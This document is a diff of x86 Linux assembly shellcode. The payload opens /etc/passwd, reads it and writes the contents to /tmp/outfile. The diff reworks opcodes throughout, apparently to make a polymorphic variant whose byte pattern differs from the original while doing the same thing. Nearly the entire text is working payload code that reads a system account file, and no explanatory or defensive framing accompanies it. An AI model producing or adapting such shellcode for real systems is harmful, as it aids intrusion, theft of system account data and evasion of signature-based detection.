@@ -5,9 +5,10 @@
 global _start
 section .text
 _start:
-    xor    eax,eax
-    push   eax
+    xor eax,eax
     mov al,0x5
+    xor ecx,ecx
+    push ecx
 
 
     ; python -c "print '\x64\x77\x73\x73\x61\x70\x2f\x63\x74\x65\x2f\x2f'"
@@ -17,8 +18,8 @@ _start:
     push 0x74652f2f
     mov ebx, esp
     int 0x80
-
-
+ 
+ 
     mov ebx,eax
     mov al,0x3
     mov edi,esp
@@ -28,17 +29,18 @@ _start:
     ; EAX=0x3 read syscall 
     int 0x80
     mov esi,eax
-
-    mov eax, 0x5
-    mov ecx, 0x5
+ 
+    xor eax, eax
+    mov al, 0x5
+    mov ecx, eax
     sub ecx,eax
     push ecx
-
+ 
     ;eliftuo/pmt/
     push 0x656c6966
     push 0x74756f2f
     push 0x706d742f
-
+ 
     ;some opcodes changed here
     push esp
     pop ebx
@@ -46,16 +48,15 @@ _start:
     push WORD 0644o
     pop edx
     int 0x80
-
+ 
     ;some opcodes changed here
     mov ebx,eax
-    mov eax, 0x4
-    ;push 0x4
-    ;pop eax
+    push 0x4
+    pop eax
     mov ecx,edi
     mov edx,esi
     int 0x80
-
+ 
     ;some opcodes changed here
     xor eax,eax
     mov ebx,eax
